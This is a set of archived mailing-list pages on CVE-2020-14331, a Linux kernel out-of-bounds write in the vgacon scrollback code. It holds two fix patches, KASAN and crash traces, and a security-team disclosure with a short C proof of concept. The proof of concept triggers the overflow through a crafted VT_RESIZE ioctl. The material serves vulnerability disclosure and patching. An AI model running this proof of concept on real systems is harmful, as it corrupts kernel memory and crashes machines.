=== Content from lists.openwall.net_94b3af65_20250119_120356.html ===


| [lists.openwall.net](https://lists.openwall.net) [lists](/)Â  /Â  [announce](https://www.openwall.com/lists/announce/)Â  [owl-users](https://www.openwall.com/lists/owl-users/)Â  [owl-dev](https://www.openwall.com/lists/owl-dev/)Â  [john-users](https://www.openwall.com/lists/john-users/)Â  [john-dev](https://www.openwall.com/lists/john-dev/)Â  [passwdqc-users](https://www.openwall.com/lists/passwdqc-users/)Â  [yescrypt](https://www.openwall.com/lists/yescrypt/)Â  [popa3d-users](https://www.openwall.com/lists/popa3d-users/)Â  /Â  [oss-security](https://www.openwall.com/lists/oss-security/)Â  [kernel-hardening](https://www.openwall.com/lists/kernel-hardening/)Â  [musl](https://www.openwall.com/lists/musl/)Â  [sabotage](https://www.openwall.com/lists/sabotage/)Â  [tlsify](https://www.openwall.com/lists/tlsify/)Â  [passwords](https://www.openwall.com/lists/passwords/)Â  /Â  [crypt-dev](https://www.openwall.com/lists/crypt-dev/)Â  [xvendor](https://www.openwall.com/lists/xvendor/)Â  /Â  [Bugtraq](/bugtraq/)Â  [Full-Disclosure](/full-disclosure/)Â  [linux-kernel](/linux-kernel/)Â  linux-[netdev](/netdev/)Â  [linux-ext4](/linux-ext4/)Â  [linux-hardening](/linux-hardening/)Â  [linux-cve-announce](/linux-cve-announce/)Â  [PHC](/phc-discussions/)| *Open Source and information security mailing list archives*|  | | | | |
| --- | --- | --- | --- | --- |

| | [Hash Suite: Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](233) [[next>]](235) [[thread-next>]](288) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20200729070249.20892-1-jslaby@suse.cz>
Date:   Wed, 29 Jul 2020 09:02:49 +0200
From:   Jiri Slaby <jslaby@...e.cz>
To:     b.zolnierkie@...sung.com
Cc:     linux-kernel@...r.kernel.org, Jiri Slaby <jslaby@...e.cz>,
        å¼ äº‘æµ· <zhangyunhai@...ocus.com>,
        Yang Yingliang <yangyingliang@...wei.com>,
        Kyungtae Kim <kt0755@...il.com>,
        Linus Torvalds <torvalds@...ux-foundation.org>,
        Greg KH <greg@...ah.com>, Solar Designer <solar@...nwall.com>,
        "Srivatsa S. Bhat" <srivatsa@...il.mit.edu>,
        Anthony Liguori <aliguori@...zon.com>,
        Security Officers <security@...nel.org>,
        linux-distros@...openwall.org, dri-devel@...ts.freedesktop.org,
        linux-fbdev@...r.kernel.org
Subject: [PATCH] vgacon: fix out of bounds write to the scrollback buffer

The current vgacon's scroll up implementation uses a circural buffer
in vgacon_scrollback_cur. It always advances tail to prepare it for the
next write and caps it to zero if the next ->vc_size_row bytes won't fit.

But when we change the VT size (e.g. by VT_RESIZE) in the meantime, the new
line might not fit to the end of the scrollback buffer in the next
attempt to scroll. This leads to various crashes as
vgacon_scrollback_update writes out of the buffer:
 BUG: unable to handle page fault for address: ffffc900001752a0
 #PF: supervisor write access in kernel mode
 #PF: error_code(0x0002) - not-present page
 RIP: 0010:mutex_unlock+0x13/0x30
...
 Call Trace:
  n_tty_write+0x1a0/0x4d0
  tty_write+0x1a0/0x2e0

Or to KASAN reports:
BUG: KASAN: slab-out-of-bounds in vgacon_scroll+0x57a/0x8ed

So check whether the line fits in the buffer and wrap if needed. Do it
before the loop as console_sem is held and ->vc_size_row cannot change
during the execution of vgacon_scrollback_cur. If it does change, we
need to ensure it does not change elsewhere, not here.

Also, we do not split the write of a line into chunks as that would
break the consumers of the buffer. They expect ->cnt, ->tail and ->size
to be in harmony and advanced by ->vc_size_row.

I found few reports of this in the past, some with patches included,
some even 2 years old:
[https://lore.kernel.org/lkml/CAEAjamsJnG-=TSOwgRbbb3B9Z-PA63oWmNPoKYWQ=Z=+X49akg@mail.gmail.com/](https://lore.kernel.org/lkml/CAEAjamsJnG-%3DTSOwgRbbb3B9Z-PA63oWmNPoKYWQ%3DZ%3D%2BX49akg%40mail.gmail.com/)
[https://lore.kernel.org/lkml/1589336932-35508-1-git-send-email-yangyingliang@huawei.com/](https://lore.kernel.org/lkml/1589336932-35508-1-git-send-email-yangyingliang%40huawei.com/)

This fixes CVE-2020-14331.

Big thanks to guys mentioned in the Reported-and-debugged-by lines below
who actually found the root cause.

Signed-off-by: Jiri Slaby <jslaby@...e.cz>
Reported-and-debugged-by: å¼ äº‘æµ· <zhangyunhai@...ocus.com>
Reported-and-debugged-by: Yang Yingliang <yangyingliang@...wei.com>
Reported-by: Kyungtae Kim <kt0755@...il.com>
Fixes: 15bdab959c9b ([PATCH] vgacon: Add support for soft scrollback)
Cc: Linus Torvalds <torvalds@...ux-foundation.org>
Cc: Greg KH <greg@...ah.com>
Cc: Solar Designer <solar@...nwall.com>
Cc: "Srivatsa S. Bhat" <srivatsa@...il.mit.edu>
Cc: Anthony Liguori <aliguori@...zon.com>
Cc: Security Officers <security@...nel.org>
Cc: linux-distros@...openwall.org
Cc: Yang Yingliang <yangyingliang@...wei.com>
Cc: Bartlomiej Zolnierkiewicz <b.zolnierkie@...sung.com>
Cc: dri-devel@...ts.freedesktop.org
Cc: linux-fbdev@...r.kernel.org
---
 drivers/video/console/vgacon.c | 5 +++++
 1 file changed, 5 insertions(+)

diff --git a/drivers/video/console/vgacon.c b/drivers/video/console/vgacon.c
index f0f3d573f848..13194bb246f8 100644
--- a/drivers/video/console/vgacon.c
+++ b/drivers/video/console/vgacon.c
@@ -250,6 +250,11 @@ static void vgacon_scrollback_update(struct vc_data *c, int t, int count)

 	p = (void *) (c->vc_origin + t * c->vc_size_row);

+	/* vc_size_row might have changed by VT_RESIZE in the meantime */
+	if ((vgacon_scrollback_cur->tail + c->vc_size_row) >=
+			vgacon_scrollback_cur->size)
+		vgacon_scrollback_cur->tail = 0;
+
 	while (count--) {
 		scr_memcpyw(vgacon_scrollback_cur->data +
 			    vgacon_scrollback_cur->tail,
--
2.28.0

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

[![Powered by Openwall GNU/*/Linux](/images/Owl-80x15-4.png)](https://www.openwall.com/Owl/ "Powered by Openwall GNU/*/Linux - security-enhanced \"Linux distribution\"")
[![Powered by OpenVZ](/images/OpenVZ-80x15-cd.png)](https://openvz.org "Powered by OpenVZ - OS virtualization solution for Linux")



=== Content from lore.kernel.org_0c709d88_20250119_134732.html ===

```
[linux-kernel.vger.kernel.org archive mirror](../?t=20200513020535)
 [help](../_/text/help/) / [color](../_/text/color/) / [mirror](../_/text/mirror/) / [Atom feed](../new.atom)
```
```
From: Yang Yingliang <yangyingliang@huawei.com>
To: <[linux-kernel@vger.kernel.org](../../lkml/?t=20200513020535)>
Cc: <b.zolnierkie@samsung.com>, <yangyingliang@huawei.com>
Subject: [[PATCH -next] vgacon: Fix an out-of-bounds in vgacon_scrollback_update()](#r)
Date: Wed, 13 May 2020 10:28:52 +0800	[[thread overview]](#r)
Message-ID: <1589336932-35508-1-git-send-email-yangyingliang@huawei.com> (<raw>)

I got a slab-out-of-bounds report when I doing fuzz test.

[  334.989515] ==================================================================
[  334.989577] BUG: KASAN: slab-out-of-bounds in vgacon_scroll+0x57a/0x8ed
[  334.989588] Write of size 1766 at addr ffff8883de69ff3e by task test/2658
[  334.989593]
[  334.989608] CPU: 3 PID: 2658 Comm: test Not tainted 5.7.0-rc5-00005-g152036d1379f #789
[  334.989617] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.12.1-0-ga5cab58e9a3f-prebuilt.qemu.org 04/01/2014
[  334.989624] Call Trace:
[  334.989646]  dump_stack+0xe4/0x14e
[  334.989676]  print_address_description.constprop.5+0x3f/0x60
[  334.989699]  ? vgacon_scroll+0x57a/0x8ed
[  334.989710]  __kasan_report.cold.8+0x92/0xaf
[  334.989735]  ? vgacon_scroll+0x57a/0x8ed
[  334.989761]  kasan_report+0x37/0x50
[  334.989789]  check_memory_region+0x1c1/0x1e0
[  334.989806]  memcpy+0x38/0x60
[  334.989824]  vgacon_scroll+0x57a/0x8ed
[  334.989876]  con_scroll+0x4ef/0x5e0
[  334.989904]  ? lockdep_hardirqs_on+0x5e0/0x5e0
[  334.989934]  lf+0x24f/0x2a0
[  334.989951]  ? con_scroll+0x5e0/0x5e0
[  334.989975]  ? find_held_lock+0x33/0x1c0
[  334.990005]  do_con_trol+0x313/0x5ff0
[  334.990027]  ? lock_downgrade+0x730/0x730
[  334.990045]  ? reset_palette+0x440/0x440
[  334.990070]  ? _raw_spin_unlock_irqrestore+0x4b/0x60
[  334.990095]  ? notifier_call_chain+0x120/0x170
[  334.990132]  ? __atomic_notifier_call_chain+0xf0/0x180
[  334.990160]  do_con_write.part.16+0xb2b/0x1b20
[  334.990238]  ? do_con_trol+0x5ff0/0x5ff0
[  334.990258]  ? mutex_lock_io_nested+0x1280/0x1280
[  334.990269]  ? rcu_read_unlock+0x50/0x50
[  334.990315]  ? __mutex_unlock_slowpath+0xd9/0x670
[  334.990340]  ? lockdep_hardirqs_on+0x3a2/0x5e0
[  334.990368]  con_write+0x36/0xc0
[  334.990389]  do_output_char+0x561/0x780
[  334.990414]  n_tty_write+0x58e/0xd30
[  334.990478]  ? n_tty_read+0x1800/0x1800
[  334.990500]  ? prepare_to_wait_exclusive+0x300/0x300
[  334.990525]  ? __might_fault+0x17a/0x1c0
[  334.990557]  tty_write+0x430/0x960
[  334.990568]  ? n_tty_read+0x1800/0x1800
[  334.990600]  ? tty_release+0x1280/0x1280
[  334.990622]  __vfs_write+0x81/0x100
[  334.990648]  vfs_write+0x1ce/0x510
[  334.990676]  ksys_write+0x104/0x200
[  334.990691]  ? __ia32_sys_read+0xb0/0xb0
[  334.990708]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[  334.990725]  ? trace_hardirqs_off_caller+0x40/0x1a0
[  334.990744]  ? do_syscall_64+0x3b/0x5e0
[  334.990775]  do_syscall_64+0xc8/0x5e0
[  334.990798]  entry_SYSCALL_64_after_hwframe+0x49/0xb3
[  334.990811] RIP: 0033:0x44f369
[  334.990827] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
[  334.990834] RSP: 002b:00007ffe9ace0968 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
[  334.990848] RAX: ffffffffffffffda RBX: 0000000000400418 RCX: 000000000044f369
[  334.990856] RDX: 0000000000000381 RSI: 0000000020003500 RDI: 0000000000000003
[  334.990865] RBP: 00007ffe9ace0980 R08: 0000000020003530 R09: 00007ffe9ace0980
[  334.990873] R10: 0000000000000001 R11: 0000000000000246 R12: 0000000000402110
[  334.990881] R13: 0000000000000000 R14: 00000000006bf018 R15: 0000000000000000
[  334.990937]
[  334.990943] The buggy address belongs to the page:
[  334.990962] page:ffffea000f79a400 refcount:1 mapcount:0 mapping:000000002bff47b3 index:0x0 head:ffffea000f79a400 order:4 compound_mapcount:0 compound_pincount:0
[  334.990973] flags: 0x2fffff80010000(head)
[  334.990992] raw: 002fffff80010000 dead000000000100 dead000000000122 0000000000000000
[  334.991006] raw: 0000000000000000 0000000000000000 00000001ffffffff 0000000000000000
[  334.991013] page dumped because: kasan: bad access detected
[  334.991017]
[  334.991023] Memory state around the buggy address:
[  334.991034]  ffff8883de6a0000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  334.991044]  ffff8883de6a0080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  334.991054] >ffff8883de6a0100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
[  334.991061]                                                              ^
[  334.991071]  ffff8883de6a0180: fc fc fc fc fc fc 00 00 00 00 00 00 00 00 00 00
[  334.991082]  ffff8883de6a0200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  334.991088] ==================================================================

Because vgacon_scrollback_cur->tail plus memcpy size is greater than
vgacon_scrollback_cur->size. Fix this by checking the memcpy size.

Reported-by: Hulk Robot <hulkci@huawei.com>
Signed-off-by: Yang Yingliang <yangyingliang@huawei.com>
---
 [drivers/video/console/vgacon.c](#Z31drivers:video:console:vgacon.c) | 11 ++++++++---
 1 file [changed](#related), 8 insertions(+), 3 deletions(-)

[diff](#iZ31drivers:video:console:vgacon.c) --git a/drivers/video/console/vgacon.c b/drivers/video/console/vgacon.c
index 998b0de1812f..b51ffb9a208d 100644
--- a/drivers/video/console/vgacon.c
+++ b/drivers/video/console/vgacon.c
@@ -243,6 +243,7 @@ static void vgacon_scrollback_startup(void)
 static void vgacon_scrollback_update(struct vc_data *c, int t, int count)
 {
 	void *p;
+	int size;

 	if (!vgacon_scrollback_cur->data || !vgacon_scrollback_cur->size ||
 	    c->vc_num != fg_console)
@@ -251,13 +252,17 @@ static void vgacon_scrollback_update(struct vc_data *c, int t, int count)
 	p = (void *) (c->vc_origin + t * c->vc_size_row);

 	while (count--) {
+		size = vgacon_scrollback_cur->size - vgacon_scrollback_cur->tail;
+		if (size > c->vc_size_row)
+			size = c->vc_size_row;
+
 		scr_memcpyw(vgacon_scrollback_cur->data +
 			    vgacon_scrollback_cur->tail,
-			    p, c->vc_size_row);
+			    p, size);

 		vgacon_scrollback_cur->cnt++;
-		p += c->vc_size_row;
-		vgacon_scrollback_cur->tail += c->vc_size_row;
+		p += size;
+		vgacon_scrollback_cur->tail += size;

 		if (vgacon_scrollback_cur->tail >= vgacon_scrollback_cur->size)
 			vgacon_scrollback_cur->tail = 0;
--
2.17.1

```

---

```
[next](../9f47ceb6-fa01-d43e-f434-86a0b1c8df64%40huawei.com/)             [reply](#R)	other threads:[[~2020-05-13  2:05 UTC](../?t=20200513020535)|[newest](../)]

Thread overview: 3+ messages / expand[[flat](T/#u)|[nested](t/#u)]  [mbox.gz](t.mbox.gz)  [Atom feed](t.atom)  [top](#b)
     [not found] <[CGME20200513020606eucas1p148e04f5d69e5c1d6a11f8dfd1604043c@eucas1p1.samsung.com](../CGME20200513020606eucas1p148e04f5d69e5c1d6a11f8dfd1604043c%40eucas1p1.samsung.com/)>
2020-05-13  2:28 ` [Yang Yingliang [this message]](#t)
2020-06-03  2:08   ` [[PATCH -next] vgacon: Fix an out-of-bounds in vgacon_scrollback_update()](../9f47ceb6-fa01-d43e-f434-86a0b1c8df64%40huawei.com/) Yang Yingliang
2020-07-10 10:47   ` [Bartlomiej Zolnierkiewicz](../62544bd9-e47d-e7f9-92f2-49b8dbb132c1%40samsung.com/)

```
```
find likely ancestor, descendant, or conflicting patches for [this message](#t):
( dfblob:998b0de1812 dfblob:b51ffb9a208 )
 OR (
bs:"[PATCH -next] vgacon: Fix an out-of-bounds in vgacon_scrollback_update()" )
	([help](../_/text/help/#search))
```

---

```
Reply instructions:

You may reply publicly to [this message](#t) via plain-text email
using any one of the following methods:

* Save the following mbox file, import it into your mail client,
  and reply-to-all from there: [mbox](raw)

  Avoid top-posting and favor interleaved quoting:
  <https://en.wikipedia.org/wiki/Posting_style#Interleaved_style>

* Reply using the --to, --cc, and --in-reply-to
  switches of git-send-email(1):

  git send-email \
    --in-reply-to=1589336932-35508-1-git-send-email-yangyingliang@huawei.com \
    --to=yangyingliang@huawei.com \
    --cc=b.zolnierkie@samsung.com \
    --cc=linux-kernel@vger.kernel.org \
    /path/to/YOUR_REPLY

  <https://kernel.org/pub/software/scm/git/docs/git-send-email.html>

* If your mail client supports setting the In-Reply-To header
  via mailto: links, try the mailto: link

```
Be sure your reply has a **Subject:** header at the top and a blank line
before the message body.

---

```
This is a public inbox, see [mirroring instructions](../_/text/mirror/)
for how to clone and mirror all data and code used for this inbox;
as well as URLs for NNTP newsgroup(s).
```


=== Content from www.openwall.com_517e42af_20250119_120356.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <c5e79bc3-3ca4-2e01-c7f0-2561ec7db4b2@nsfocus.com>
Date: Tue, 28 Jul 2020 11:16:55 +0800
From: å¼ äº‘æµ· <zhangyunhai@...ocus.com>
To: oss-security@...ts.openwall.com
Subject: [CVE-2020-14331] Linux Kernel: buffer over write in
 vgacon_scrollback_update

There is a buffer over write in drivers/video/console/vgacon.c in
vgacon_scrollback_update.

The issue is reported by Yunhai Zhang / NSFOCUS Security Team
<zhangyunhai@...ocus.com>, CVE-2020-14331 assigned via Red Hat.

# Affected Versions
The issue is found and tested on 5.7.0-rc6.
The issue is introduced in commit:
15bdab959c9bb909c0317480dd9b35748a8f7887 ([PATCH] vgacon: Add support
for soft scrollback)
According to code review, all versions older than
92ed301919932f777713b9172e525674157e983d (v5.8-rc7) are affected.

# Root Cause
In vgacon_scrollback_update, there is a memcpy without enough bound check:
		scr_memcpyw(vgacon_scrollback_cur->data +
			    vgacon_scrollback_cur->tail,
			    p, c->vc_size_row);
Here vgacon_scrollback_cur->data is a buffer of size
vgacon_scrollback_cur->size which is a multiple of c->vc_size_row,
vgacon_scrollback_cur->tail increase c->vc_size_row each time and reset
to zero when exceed vgacon_scrollback_cur->size. Thus, the copy does not
seem to overflow. However, c->vc_size_row can be reset by calling
ioctl(VT_RESIZE), and a crafted new c->vc_size_row can cause the copy to
overflow.

# PoC
To trigger the overflow, CONFIG_VGACON_SOFT_SCROLLBACK should be set in
.config, and vgacon should be selected as the current console.

	#include <stdio.h>
	#include <stdlib.h>
	#include <unistd.h>
	#include <sys/types.h>
	#include <sys/stat.h>
	#include <sys/ioctl.h>
	#include <fcntl.h>

	int main(int argc, char** argv)
	{
		int fd = open(argv[1], O_RDWR, 0);

		unsigned short size[3] = {8, 1859, 0};
		ioctl(fd, 0x5609, size); // VT_RESIZE

		for (int i = 0; i < 18; i++) {
			write(fd, "\x0a", 1);
		}
	}

GPF in dmesg:
	[   65.025031] general protection fault, probably for non-canonical
address 0x720072007200720: 0000 [#1] SMP PTI
	[   65.045029] CPU: 0 PID: 1054 Comm: ls Not tainted 5.7.0-rc6 #1
	[   65.063110] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.13.0-1ubuntu1 04/01/2014
	[   65.082886] RIP: 0010:rb_next+0x14/0x50
	[   65.104442] Code: 89 d8 e9 27 ff ff ff 48 c7 07 01 00 00 00 c3 0f 1f
80 00 00 00 00 48 8b 17 48 39 d7 74 35 48 8b 47 08 48 85 c0 74 1c 49 89
c0 <48> 8b 40 10 48 85 c0 75 f4 4c 89 c0 c3 48 3b 78 08 75 f6 48 8b 10
	[   65.125863] RSP: 0018:ffffc9000076fe08 EFLAGS: 00010202
	[   65.143457] RAX: 0720072007200720 RBX: ffffc9000076fec0 RCX:
000055f3dd2e0625
	[   65.163220] RDX: ffff88807d570f89 RSI: 0000000000007562 RDI:
ffff88807d570748
	[   65.181504] RBP: ffffc9000076fe38 R08: 0720072007200720 R09:
00007ffffffff000
	[   65.199761] R10: 000055f3dd2e05f8 R11: 0000000000000000 R12:
ffff88807d5706c0
	[   65.218000] R13: ffff88807d5706c0 R14: 0000000000000001 R15:
ffffffff8130bc30
	[   65.239453] FS:  00007fb1f812e400(0000) GS:ffff88807dc00000(0000)
knlGS:0000000000000000
	[   65.258165] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
	[   65.275872] CR2: 000055f3dd2e85b8 CR3: 000000005b992000 CR4:
00000000000006f0
	[   65.294578] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
0000000000000000
	[   65.313018] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
0000000000000400
	[   65.330906] Call Trace:
	[   65.349469]  ? proc_readdir_de+0x1bf/0x240
	[   65.366671]  proc_readdir+0x16/0x20
	[   65.383948]  proc_root_readdir+0x22/0x40
	[   65.401034]  iterate_dir+0x9e/0x1b0
	[   65.417970]  ksys_getdents64+0x9c/0x140
	[   65.435156]  ? filldir+0x190/0x190
	[   65.455622]  __x64_sys_getdents64+0x1a/0x20
	[   65.472988]  do_syscall_64+0x57/0x1b0
	[   65.489894]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
	[   65.507195] RIP: 0033:0x7fb1f82c92ab
	[   65.524244] Code: 0f 1e fa 48 8b 47 20 c3 0f 1f 80 00 00 00 00 f3 0f
1e fa 48 81 fa ff ff ff 7f b8 ff ff ff 7f 48 0f 47 d0 b8 d9 00 00 00 0f
05 <48> 3d 00 f0 ff ff 77 05 c3 0f 1f 40 00 48 8b 15 b1 9b 10 00 f7 d8
	[   65.549391] RSP: 002b:00007ffc67f69048 EFLAGS: 00000293 ORIG_RAX:
00000000000000d9
	[   65.569099] RAX: ffffffffffffffda RBX: 000055f3dd2e05b0 RCX:
00007fb1f82c92ab
	[   65.592219] RDX: 0000000000008000 RSI: 000055f3dd2e05b0 RDI:
0000000000000003
	[   65.610551] RBP: fffffffffffffe98 R08: 0000000000000030 R09:
000000000000007c
	[   65.630375] R10: 0000000000000000 R11: 0000000000000293 R12:
000055f3dd2e0584
	[   65.650886] R13: 0000000000000000 R14: 000055f3dd2e0580 R15:
000055f3db6c27fe
	[   65.669554] Modules linked in: nls_iso8859_1 drm_vram_helper
drm_ttm_helper ttm drm_kms_helper cec fb_sys_fops joydev syscopyarea
input_leds sysfillrect serio_raw sysimgblt mac_hid qemu_fw_cfg
sch_fq_codel drm parport_pc ppdev lp parport ip_tables x_tables autofs4
hid_generic usbhid hid psmouse e1000 i2c_piix4 pata_acpi floppy
	[   65.693633] ---[ end trace d08af5ec396bea6d ]---
	[   65.711185] RIP: 0010:rb_next+0x14/0x50
	[   65.731940] Code: 89 d8 e9 27 ff ff ff 48 c7 07 01 00 00 00 c3 0f 1f
80 00 00 00 00 48 8b 17 48 39 d7 74 35 48 8b 47 08 48 85 c0 74 1c 49 89
c0 <48> 8b 40 10 48 85 c0 75 f4 4c 89 c0 c3 48 3b 78 08 75 f6 48 8b 10
	[   65.753937] RSP: 0018:ffffc9000076fe08 EFLAGS: 00010202
	[   65.775013] RAX: 0720072007200720 RBX: ffffc9000076fec0 RCX:
000055f3dd2e0625
	[   65.792795] RDX: ffff88807d570f89 RSI: 0000000000007562 RDI:
ffff88807d570748
	[   65.810378] RBP: ffffc9000076fe38 R08: 0720072007200720 R09:
00007ffffffff000
	[   65.828354] R10: 000055f3dd2e05f8 R11: 0000000000000000 R12:
ffff88807d5706c0
	[   65.846504] R13: ffff88807d5706c0 R14: 0000000000000001 R15:
ffffffff8130bc30
	[   65.865418] FS:  00007fb1f812e400(0000) GS:ffff88807dc00000(0000)
knlGS:0000000000000000
	[   65.883079] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
	[   65.903615] CR2: 000055f3dd2e85b8 CR3: 000000005b992000 CR4:
00000000000006f0
	[   65.924849] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
0000000000000000
	[   65.942933] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
0000000000000400

# Patch
Linus has rewrite the whole function.
However, I provide a one-line-fix patch here to make it easier to
backport to older stable kernels.

Regards,
Yunhai Zhang / NSFOCUS Security Team

View attachment "[0001-Fix-for-missing-check-in-vgacon-scrollback-handling.patch](2/1)" of type "text/plain" (1243 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lore.kernel.org_b1ce8574_20250119_134732.html ===

```
[linux-kernel.vger.kernel.org archive mirror](../?t=20200513020535)
 [help](../_/text/help/) / [color](../_/text/color/) / [mirror](../_/text/mirror/) / [Atom feed](../new.atom)
```
```
From: Yang Yingliang <yangyingliang@huawei.com>
To: <[linux-kernel@vger.kernel.org](../../lkml/?t=20200513020535)>
Cc: <b.zolnierkie@samsung.com>, <yangyingliang@huawei.com>
Subject: [[PATCH -next] vgacon: Fix an out-of-bounds in vgacon_scrollback_update()](#r)
Date: Wed, 13 May 2020 10:28:52 +0800	[[thread overview]](#r)
Message-ID: <1589336932-35508-1-git-send-email-yangyingliang@huawei.com> (<raw>)

I got a slab-out-of-bounds report when I doing fuzz test.

[  334.989515] ==================================================================
[  334.989577] BUG: KASAN: slab-out-of-bounds in vgacon_scroll+0x57a/0x8ed
[  334.989588] Write of size 1766 at addr ffff8883de69ff3e by task test/2658
[  334.989593]
[  334.989608] CPU: 3 PID: 2658 Comm: test Not tainted 5.7.0-rc5-00005-g152036d1379f #789
[  334.989617] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.12.1-0-ga5cab58e9a3f-prebuilt.qemu.org 04/01/2014
[  334.989624] Call Trace:
[  334.989646]  dump_stack+0xe4/0x14e
[  334.989676]  print_address_description.constprop.5+0x3f/0x60
[  334.989699]  ? vgacon_scroll+0x57a/0x8ed
[  334.989710]  __kasan_report.cold.8+0x92/0xaf
[  334.989735]  ? vgacon_scroll+0x57a/0x8ed
[  334.989761]  kasan_report+0x37/0x50
[  334.989789]  check_memory_region+0x1c1/0x1e0
[  334.989806]  memcpy+0x38/0x60
[  334.989824]  vgacon_scroll+0x57a/0x8ed
[  334.989876]  con_scroll+0x4ef/0x5e0
[  334.989904]  ? lockdep_hardirqs_on+0x5e0/0x5e0
[  334.989934]  lf+0x24f/0x2a0
[  334.989951]  ? con_scroll+0x5e0/0x5e0
[  334.989975]  ? find_held_lock+0x33/0x1c0
[  334.990005]  do_con_trol+0x313/0x5ff0
[  334.990027]  ? lock_downgrade+0x730/0x730
[  334.990045]  ? reset_palette+0x440/0x440
[  334.990070]  ? _raw_spin_unlock_irqrestore+0x4b/0x60
[  334.990095]  ? notifier_call_chain+0x120/0x170
[  334.990132]  ? __atomic_notifier_call_chain+0xf0/0x180
[  334.990160]  do_con_write.part.16+0xb2b/0x1b20
[  334.990238]  ? do_con_trol+0x5ff0/0x5ff0
[  334.990258]  ? mutex_lock_io_nested+0x1280/0x1280
[  334.990269]  ? rcu_read_unlock+0x50/0x50
[  334.990315]  ? __mutex_unlock_slowpath+0xd9/0x670
[  334.990340]  ? lockdep_hardirqs_on+0x3a2/0x5e0
[  334.990368]  con_write+0x36/0xc0
[  334.990389]  do_output_char+0x561/0x780
[  334.990414]  n_tty_write+0x58e/0xd30
[  334.990478]  ? n_tty_read+0x1800/0x1800
[  334.990500]  ? prepare_to_wait_exclusive+0x300/0x300
[  334.990525]  ? __might_fault+0x17a/0x1c0
[  334.990557]  tty_write+0x430/0x960
[  334.990568]  ? n_tty_read+0x1800/0x1800
[  334.990600]  ? tty_release+0x1280/0x1280
[  334.990622]  __vfs_write+0x81/0x100
[  334.990648]  vfs_write+0x1ce/0x510
[  334.990676]  ksys_write+0x104/0x200
[  334.990691]  ? __ia32_sys_read+0xb0/0xb0
[  334.990708]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[  334.990725]  ? trace_hardirqs_off_caller+0x40/0x1a0
[  334.990744]  ? do_syscall_64+0x3b/0x5e0
[  334.990775]  do_syscall_64+0xc8/0x5e0
[  334.990798]  entry_SYSCALL_64_after_hwframe+0x49/0xb3
[  334.990811] RIP: 0033:0x44f369
[  334.990827] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
[  334.990834] RSP: 002b:00007ffe9ace0968 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
[  334.990848] RAX: ffffffffffffffda RBX: 0000000000400418 RCX: 000000000044f369
